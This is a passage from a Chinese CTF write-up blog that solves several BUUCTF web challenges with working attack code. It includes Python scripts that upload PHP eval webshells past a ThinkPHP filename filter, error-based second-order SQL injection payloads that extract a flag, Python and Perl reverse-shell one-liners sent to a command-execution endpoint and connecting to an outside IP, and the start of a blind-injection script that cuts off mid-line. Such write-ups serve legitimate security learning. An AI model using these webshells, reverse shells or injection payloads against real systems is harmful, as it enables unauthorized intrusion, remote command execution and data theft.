<p>q2必须以<a href="http://127.0.0.1开头，并且不能有flag，q1无限制，q3必须为GET或者POST" target="_blank" rel="noopener">http://127.0.0.1开头，并且不能有flag，q1无限制，q3必须为GET或者POST</a></p>
<p>之后将$url中的内容读入字符串中，之后使用%d输出<br>其中url后面会拼接无用字符，可以使用<code>#</code>注释或者另外使用<code>?a=xxx</code>来传参</p>
<p>这里涉及到了字符串的格式化的知识，%d会将$detect（即源码）以二进制数的形式输出，所以并不能得到我们需要的源码。</p>
<p>而主要思路就是让$detect以字符串形式（%s）来输出，我们有两种读取admin.php源码的方法：</p>
<blockquote>
<ol>
<li>%1$s  ——  这种办法原理是%1$s会将第一个参数用string类型输出，而这道题中第一个参数便是admin.php的源码，语句是：</li>
</ol>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">print</span>(<span class="keyword">sprintf</span>(<span class="string">"$url method&amp;content_size:"</span>GET%1$s%d<span class="string">", $detect));  // %1$s会以字符串格式输出$detect，而%d会输出0</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<ol>
<li>%s%  ——  这种办法的原理是sprintf()函数中%可以转义掉%，这样语句就变成了：</li>
</ol>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">print</span>(<span class="keyword">sprintf</span>(<span class="string">"$url method&amp;content_size:"</span>GET%s%%d<span class="string">", $detect));  // %d前的%被转义，因此失</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>所以可以读取admin.php 的源码了</p>
<blockquote>
<p>q1:随便输<br>q2:<a href="http://127.0.0.1/admin#或者http://127.0.0.1/admin.php?a=xxx" target="_blank" rel="noopener">http://127.0.0.1/admin#或者http://127.0.0.1/admin.php?a=xxx</a><br>q3:%s%或者%1$s</p>
</blockquote>
<p><img src="/2020/06/05/BUU-web%E5%88%B7%E9%A2%98%E5%85%AD/1590639840135.png" alt="1590639840135"></p>
<p>得到admin.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line">$f1ag = <span class="string">'f1ag&#123;s1mpl3_SSRF_@nd_spr1ntf&#125;'</span>; <span class="comment">//fake</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aesEn</span><span class="params">($data, $key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $method = <span class="string">'AES-128-CBC'</span>;</span><br><span class="line">    $iv = md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>],<span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">return</span>  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">'your_ip_address'</span>]) &amp;&amp; $_COOKIE[<span class="string">'your_ip_address'</span>] === md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &amp;&amp; $_COOKIE[<span class="string">'y1ng'</span>] === sha1(md5(<span class="string">'y1ng'</span>)))</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( $_SERVER[<span class="string">'REMOTE_ADDR'</span>] == <span class="string">"127.0.0.1"</span> ) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=black&gt;&lt;center&gt;&lt;font size='10px' color=white&gt;&lt;br&gt;only 127.0.0.1 can access! You know what I mean right?&lt;br&gt;your ip address is "</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">'user'</span>] = md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'decrypt'</span>])) &#123;</span><br><span class="line">    $decr = $_GET[<span class="string">'decrypt'</span>];</span><br><span class="line">    <span class="keyword">if</span> (Check())&#123;</span><br><span class="line">        $data = $_SESSION[<span class="string">'secret'</span>];</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'flag_2sln2ndln2klnlksnf.php'</span>;</span><br><span class="line">        $cipher = aesEn($data, <span class="string">'y1ng'</span>);		<span class="comment">#通过get传如的必须等于加密后的字符串</span></span><br><span class="line">        <span class="keyword">if</span> ($decr === $cipher)&#123;</span><br><span class="line">            <span class="keyword">echo</span> WHAT_YOU_WANT;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'爬'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        header(<span class="string">"Refresh:0.1;url=index.php"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//I heard you can break PHP mt_rand seed</span></span><br><span class="line">    mt_srand(rand(<span class="number">0</span>,<span class="number">9999999</span>));</span><br><span class="line">    $length = mt_rand(<span class="number">40</span>,<span class="number">80</span>);</span><br><span class="line">    $_SESSION[<span class="string">'secret'</span>] = bin2hex(random_bytes($length));</span><br><span class="line">&#125;</span><br><span class="line">?</span><br></pre></td></tr></table></figure>

<p>这里由于伪随机数是真的随机的，不能爆破，所以必须要进行绕过，这里有一个Trick：</p>
<blockquote>
<p>session绕过。删除cookie，没有cookie中的SESSIONID就找不到对应的session文件，相应的$_SESSION[‘var’]就为NULL，传参NULL。</p>
<p>引用自: <a href="https://www.jianshu.com/p/9c031dee57b7" target="_blank" rel="noopener">https://www.jianshu.com/p/9c031dee57b7</a></p>
</blockquote>
<p>所以只要我们在访问admin.php时，删除session访问，代码就会变成：</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">$cipher = aesEn(<span class="literal">NULL</span>, <span class="string">'y1ng'</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>因此我们就可以计算出密钥，从而获得Flag</p>
<p>加密后的字符串：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aesEn</span><span class="params">($data, $key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $method = <span class="string">'AES-128-CBC'</span>;</span><br><span class="line">    $iv = md5(<span class="string">'174.0.0.2'</span>,<span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">return</span>  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> aesEn(<span class="keyword">NULL</span>,<span class="string">'y1ng'</span>);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Gh1BXo8eH92fqnm0EyfREw==</p>
</blockquote>
<p>接着访问admin.php，删除SESSIONISD，再传入加密后的字符串即可得到flag，如果字符串中有特殊字符，需要进行url 编码后传参<br><img src="/2020/06/05/BUU-web%E5%88%B7%E9%A2%98%E5%85%AD/1590641146540.png" alt="1590641146540"></p>
<h1 id="RoarCTF-2019-Simple-Upload"><a href="#RoarCTF-2019-Simple-Upload" class="headerlink" title="[RoarCTF 2019]Simple Upload"></a>[RoarCTF 2019]Simple Upload</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $uploadFile = $_FILES[<span class="string">'file'</span>] ;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (strstr(strtolower($uploadFile[<span class="string">'name'</span>]), <span class="string">".php"</span>) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        $upload = <span class="keyword">new</span> \Think\Upload();<span class="comment">// 实例化上传类</span></span><br><span class="line">        $upload-&gt;maxSize  = <span class="number">4096</span> ;<span class="comment">// 设置附件上传大小</span></span><br><span class="line">        $upload-&gt;allowExts  = <span class="keyword">array</span>(<span class="string">'jpg'</span>, <span class="string">'gif'</span>, <span class="string">'png'</span>, <span class="string">'jpeg'</span>);<span class="comment">// 设置附件上传类型</span></span><br><span class="line">        $upload-&gt;rootPath = <span class="string">'./Public/Uploads/'</span>;<span class="comment">// 设置附件上传目录</span></span><br><span class="line">        $upload-&gt;savePath = <span class="string">''</span>;<span class="comment">// 设置附件上传子目录</span></span><br><span class="line">        $info = $upload-&gt;upload() ;</span><br><span class="line">        <span class="keyword">if</span>(!$info) &#123;<span class="comment">// 上传错误提示错误信息</span></span><br><span class="line">          <span class="keyword">$this</span>-&gt;error($upload-&gt;getError());</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">// 上传成功 获取上传文件信息</span></span><br><span class="line">          $url = __ROOT__.substr($upload-&gt;rootPath,<span class="number">1</span>).$info[<span class="string">'file'</span>][<span class="string">'savepath'</span>].$info[<span class="string">'file'</span>][<span class="string">'savename'</span>] ;</span><br><span class="line">          <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">"url"</span>=&gt;$url,<span class="string">"success"</span>=&gt;<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>方法一</strong></p>
<p><strong>Think PHP上传默认路径</strong></p>
<p>这段代码为Thinkphp框架，其默认上传路径是/home/index/upload，代码过滤了<code>.php</code>后缀，也限制了上传类型。</p>
<p><strong>Think PHP upload()多文件上传</strong></p>
<p>在ThinkPHP里的upload()函数在不传参的情况下是批量上传的，这里可以理解为防护机制只会检测一次，运用条件竞争，多次上传便可以绕过文件后缀的检测</p>
<p><strong>ThinkPHP 上传文件名爆破</strong></p>
<p>这里的后缀命名方式运用了uniqid函数它是基于微秒的当前时间来更改文件名的，两个同时上传生成的文件名相差不会太远。先上传一个正常文件再上传一个木马文件，然后再上传一个正常文件，然后根据第一和第三个正常文件的文件名之间的差异，爆破出我们上传的木马文件名。<br><img src="/2020/06/05/BUU-web%E5%88%B7%E9%A2%98%E5%85%AD/1590757435181.png" alt="1590757435181"></p>
<p>可以看到差距不大并且有规律</p>
<p><strong>使用python脚本上传</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://f682b876-7016-4984-b1ab-a58d445a1164.node3.buuoj.cn/index.php/home/index/upload'</span></span><br><span class="line">files = &#123;<span class="string">'file'</span>:(<span class="string">"1.txt"</span>,<span class="string">""</span>)&#125;</span><br><span class="line">files2=&#123;<span class="string">'file[]'</span>:(<span class="string">'1.php'</span>,<span class="string">"&lt;?php eval($_GET['cmd'])?&gt;"</span>)&#125;  <span class="comment">##upload()不传参时即是批量上传所以用[]</span></span><br><span class="line">r = requests.post(url,files = files)</span><br><span class="line"><span class="keyword">print</span> (r.text)</span><br><span class="line">r = requests.post(url,files = files2)</span><br><span class="line"><span class="keyword">print</span> (r.text)</span><br><span class="line">r = requests.post(url,files = files)</span><br><span class="line"><span class="keyword">print</span> (r.text)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/05/BUU-web%E5%88%B7%E9%A2%98%E5%85%AD/1590757678025.png" alt="1590757678025"></p>
<p>这里可以发现文件名只有后五位不同(有时候是六位，可以多试几次)，并且木马文件位于两者之间的数字和字母<br>爆破，参考师傅们的脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://b718a952-ff8f-46e1-b071-4d96d9b3b90e.node3.buuoj.cn/"</span></span><br><span class="line"></span><br><span class="line">path = url + <span class="string">"/index.php/home/index/upload"</span></span><br><span class="line">files = &#123;<span class="string">"file"</span>:(<span class="string">"a.txt"</span>,<span class="string">'a'</span>), <span class="string">"file1"</span>:(<span class="string">"b.php"</span>, <span class="string">'&lt;?php eval($_GET["a"]);'</span>)&#125;</span><br><span class="line">r = requests.post(path, files=files)</span><br><span class="line">t1 = r.text.split(<span class="string">"/"</span>)[<span class="number">-1</span>].split(<span class="string">"."</span>)[<span class="number">0</span>]</span><br><span class="line">param=json.loads(r.content)</span><br><span class="line"><span class="comment">#json.loads()用于将str类型的数据转成dict</span></span><br><span class="line"><span class="keyword">print</span> param</span><br><span class="line">t1 = int(t1, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">j = t1</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    path = url + <span class="string">"/Public/Uploads/"</span>+param[<span class="string">'url'</span>].split(<span class="string">"/"</span>)[<span class="number">-2</span>]+<span class="string">"/%s.php"</span> % hex(j)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(path,timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">429</span>:<span class="comment">#规避过于频繁访问导致的429</span></span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">elif</span> r.status_code != <span class="number">404</span>:</span><br><span class="line">        <span class="keyword">print</span> path</span><br><span class="line">        <span class="keyword">print</span> r.text</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span> j, path, r.status_code</span><br><span class="line">    j -= <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><strong>方法二</strong></p>
<p>参考文章：<a href="https://github.red/roarctf-web-writeup/#simpleupload" target="_blank" rel="noopener">https://github.red/roarctf-web-writeup/#simpleupload</a></p>
<blockquote>
<p>下载一个 ThinkPHP 3 的源码，<code>ThinkPHP/Library/Think/Upload.class.php</code>就是<code>Upload</code>类的源码。我们可以发现上述代码中的<code>allowExts</code>属性其实并不存在，TP3 中限制上传文件后缀类型的属性应该是<code>exts</code>。<br>所以问题就在于如何绕过上述对于<code>.php</code>的限制。在<code>Upload.class.php</code>的第 157 行，有这么一句：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$file[<span class="string">'name'</span>] = strip_tags($file[<span class="string">'name'</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>就是这一句，恰好弄巧成拙了。<code>strip_tags()</code>函数会去除文件名中的 HTML 标签。因此我们可以构造形如<code>.p&lt;br&gt;hp</code>这样的文件后缀，从而绕过对于<code>.php</code>的检测，进入 TP3 的上传类中，它又会帮我们去除 HTML 标签。<br>因此向<code>index.php/Home/Index/upload</code>上传一个<code>.p&lt;br&gt;hp</code>格式的 webshell 即可。</p>
</blockquote>
<p>所以使用呢python上传</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://fe13ea65-038f-4b7b-a2fe-f1333c94ce7f.node3.buuoj.cn/index.php/home/index/upload'</span></span><br><span class="line">files2=&#123;<span class="string">'file'</span>:(<span class="string">'1.p&lt;br&gt;hp'</span>,<span class="string">"&lt;?php eval($_GET['cmd'])?&gt;"</span>)&#125;</span><br><span class="line">r = requests.post(url,files = files2)</span><br><span class="line"><span class="keyword">print</span> (r.text)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/05/BUU-web%E5%88%B7%E9%A2%98%E5%85%AD/1591232125484.png" alt="1591232125484"></p>
<p>访问得到flag</p>
<h1 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h1><p>知识点：二次注入<br>打开靶机为一个登陆页面，有登陆，注册等功能。随便注册登陆之后发现可以修改密码，猜测存在二次注入</p>
<p>经过几次尝试之后，当注册用户名为<code>xxxxxx&quot;</code>时，在修改密码之后会报错<br><img src="/2020/06/05/BUU-web%E5%88%B7%E9%A2%98%E5%85%AD/1591235764538.png" alt="1591235764538"></p>
<p>猜测SQL语句为<code>select * from user where username=&quot;1111&quot;&quot; and password=&#39;d41d8cd98f00b204e9800998ecf8427e&#39;</code></p>
<p>但是在注册用户的username出有过滤，fuzz一下<br><img src="/2020/06/05/BUU-web%E5%88%B7%E9%A2%98%E5%85%AD/1591238088170.png" alt="1591238088170"></p>
<p>注册一个用户名为<code>aaa&quot;||updatexml(1,concat(0x7e,database(),0x7e),1)#</code>的用户<br>修改密码后的到数据库名<br><img src="/2020/06/05/BUU-web%E5%88%B7%E9%A2%98%E5%85%AD/1591238634082.png" alt="1591238634082"></p>
<p>之后爆表名</p>
<blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">aaa"||(updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema=<span class="keyword">database</span>())),<span class="number">0x7e</span>),<span class="number">1</span>))<span class="comment">#</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/2020/06/05/BUU-web%E5%88%B7%E9%A2%98%E5%85%AD/1591239492349.png" alt="1591239492349"></p>
<p>列名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">aaa"||(updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name=<span class="string">'flag'</span>)),<span class="number">0x7e</span>),<span class="number">1</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/05/BUU-web%E5%88%B7%E9%A2%98%E5%85%AD/1591239570708.png" alt="1591239570708"></p>
<p>数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">aaa"||(updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(flag))<span class="keyword">from</span>(flag)),<span class="number">0x7e</span>),<span class="number">1</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>但是flag不在flag中，查看users表</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">aaa"||(updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name=<span class="string">'users'</span>)),<span class="number">0x7e</span>),<span class="number">1</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/05/BUU-web%E5%88%B7%E9%A2%98%E5%85%AD/1591239768752.png" alt="1591239768752"></p>
<p>很明显该列没有输出完整,输出长度受限，并且用该列名去查flag会显示</p>
<p><img src="/2020/06/05/BUU-web%E5%88%B7%E9%A2%98%E5%85%AD/1591240082619.png" alt="1591240082619"></p>
<p>使用regexp正则来匹配</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">aaa"^(updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name=<span class="string">'users'</span>)&amp;&amp;(column_name)regexp(<span class="string">'^r'</span>)),<span class="number">0x7e</span>),<span class="number">1</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/05/BUU-web%E5%88%B7%E9%A2%98%E5%85%AD/1591240315057.png" alt="1591240315057"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">aaa"||(updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(real_flag_1s_here))<span class="keyword">from</span>(<span class="keyword">users</span>)),<span class="number">0x7e</span>),<span class="number">1</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/05/BUU-web%E5%88%B7%E9%A2%98%E5%85%AD/1591240419934.png" alt="1591240419934"></p>
<p>显示<code>xxx</code>，则同样使用正则匹配</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">aaa"^(updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(real_flag_1s_here))<span class="keyword">from</span>(<span class="keyword">users</span>)<span class="keyword">where</span>(real_flag_1s_here)regexp(<span class="string">'^f'</span>)),<span class="number">0x7e</span>),<span class="number">1</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/05/BUU-web%E5%88%B7%E9%A2%98%E5%85%AD/1591240731986.png" alt="1591240731986"></p>
<p><code>flag{4b66b7ec-0473-4ac0-b552-69</code><br>我淦！<br>逆序输出</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">aaa"^(updatexml(1,concat(0x7e,reverse((<span class="keyword">select</span>(<span class="keyword">group_concat</span>(real_flag_1s_here))<span class="keyword">from</span>(<span class="keyword">users</span>)<span class="keyword">where</span>(real_flag_1s_here)regexp(<span class="string">'^f'</span>))),<span class="number">0x7e</span>),<span class="number">1</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/05/BUU-web%E5%88%B7%E9%A2%98%E5%85%AD/1591240977952.png" alt="1591240977952"></p>
<p>拼接一下就好了<br><img src="/2020/06/05/BUU-web%E5%88%B7%E9%A2%98%E5%85%AD/1591241126316.png" alt="1591241126316"></p>
<p>flag{4b66b7ec-0473-4ac0-b552-692e3422eb0c}</p>
<p>参考文章：<a href="https://www.cnblogs.com/peri0d/p/11599643.html" target="_blank" rel="noopener">https://www.cnblogs.com/peri0d/p/11599643.html</a></p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUU-web三</title>
    <url>/2020/04/08/BUU-Web3/</url>
    <content><![CDATA[<p>BUUCTF-web刷题(三)</p>
<p><strong>[V&amp;N2020公开赛]CHECKIN</strong><br>知识点：python代码审计</p>
<p><strong>[极客大挑战2019]FinalSQL</strong><br>知识点：异或注入</p>
<p><strong>[WesternCTF2018]shrine</strong><br>知识点：python代码审计</p>
<p><strong>[安洵杯2019]easy_ web</strong><br>知识点：强类型MD5碰撞绕过md5</p>
<p><strong>[CISCN2019Web1 ]Dropbox</strong><br>知识点：phar反序列化</p>
<p><strong>[网鼎杯2018]F akebook</strong><br>知识点：SQL注入，反序列化</p>
<p><strong>[GXYCTF2019]BabysqliV3.0</strong><br>知识点：phar反序列化</p>
<p><strong>[GXYCTF2019]禁止套娃</strong><br>知识点：无参数rce</p>
<a id="more"></a>

<h1 id="V-amp-N2020-公开赛-CHECKIN"><a href="#V-amp-N2020-公开赛-CHECKIN" class="headerlink" title="[V&amp;N2020 公开赛]CHECKIN"></a>[V&amp;N2020 公开赛]CHECKIN</h1><p>源码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">flag_file = open(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>)</span><br><span class="line"><span class="comment"># flag = flag_file.read()</span></span><br><span class="line"><span class="comment"># flag_file.close()</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># @app.route('/flag')</span></span><br><span class="line"><span class="comment"># def flag():</span></span><br><span class="line"><span class="comment">#     return flag</span></span><br><span class="line"><span class="comment">## want flag? naive!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># You will never find the thing you want:) I think</span></span><br><span class="line"><span class="meta">@app.route('/shell')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span><span class="params">()</span>:</span></span><br><span class="line">    os.system(<span class="string">"rm -f flag.txt"</span>)</span><br><span class="line">    exec_cmd = request.args.get(<span class="string">'c'</span>)</span><br><span class="line">    os.system(exec_cmd)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"1"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">source</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"app.py"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure>

<p>这是一个Flask框架，当访问靶机的时候，会以内网进行访问，然后变量<code>flag_file</code>会打开<code>flag.txt</code>文件，在路由<code>/</code>下，会返回<code>app.py</code>的代码，当访问<code>/shell</code>路由时，会执行命令删除flag文件，然后会获取以<code>GET</code>形式传参的变量<code>c</code>的值执行系统命令，同时返回字符<code>1</code>，因为<code>c</code>的值会执行系统命令，所以此处应该就是可以进行反弹shell的<img src="/2020/04/08/BUU-Web3/1.png" alt><br>先在BUU内网开一个靶机，ip地址为174.1.230.162<br>我们可以使用python和perl反弹shell</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="keyword">shell</span>?c=python3%20-c%20<span class="string">"import%20os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%27174.1.230.162%27,7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([%27/bin/bash%27,%27-i%27]);"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">shell</span>?c=perl -MIO -<span class="keyword">e</span> '<span class="variable">$p</span>=fork;<span class="keyword">exit</span>,<span class="keyword">if</span>(<span class="variable">$p</span>);<span class="variable">$c</span>=new IO::Socket::INET(PeerAddr,<span class="string">"IP:端口"</span>);STDIN-&gt;fdopen(<span class="variable">$c</span>,r);$~-&gt;fdopen(<span class="variable">$c</span>,w);system<span class="variable">$_</span> <span class="keyword">while</span>&lt;&gt;;'</span><br></pre></td></tr></table></figure>

<p>因为执行<code>/shell</code>路由时，会删掉原本的<code>flag.txt</code>文件。但是flag是存入内存中的，所以此时可以读取内存进程中的flag。<br><a href="https://blog.csdn.net/danwuxie/article/details/80893655" target="_blank" rel="noopener">Linux proc文件系统</a><br>在文件夹<code>/proc</code>下，会保存当前运行进程相关部分<br><img src="/2020/04/08/BUU-Web3/2.png" alt><br>发现一些数字，这些数字是进程ID<br>然后再/proc/10目录下发现<code>fd</code>文件夹，该文件夹包含当前进程打开的每一个文件的文件描述符，而我们要找的flag便在文件描述符中。进入后发现flag<br><img src="/2020/04/08/BUU-Web3/3.png" alt></p>
<h1 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h1><p>开始在username和password上面寻找注入点，但是没有任何发现。然后百度发现了要使用异或注入,并且注入点在?id</p>
<blockquote>
<p>异或运算规则:<br><code>1^1=0 0^0=0 0^1=1</code><br><code>1^1^1=0 1^1^0=0</code></p>
</blockquote>
<p>payload:</p>
<blockquote>
<p>1^ascii(substr(database(),0,1))&gt;1^1</p>
</blockquote>
<p>然后写一个盲注脚本(题目提示使用盲注)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">"http://40a83957-557e-4e05-ac35-c60063407a0d.node3.buuoj.cn/search.php"</span></span><br><span class="line">DB=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high=<span class="number">128</span></span><br><span class="line">    mid=(low+high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> (high&gt;low):</span><br><span class="line">        payload = <span class="string">"?id=1^(ascii(substr(database(),"</span>+str(i)+<span class="string">",1))&gt;"</span>+str(mid)+<span class="string">")^1"</span></span><br><span class="line">        payload2 = <span 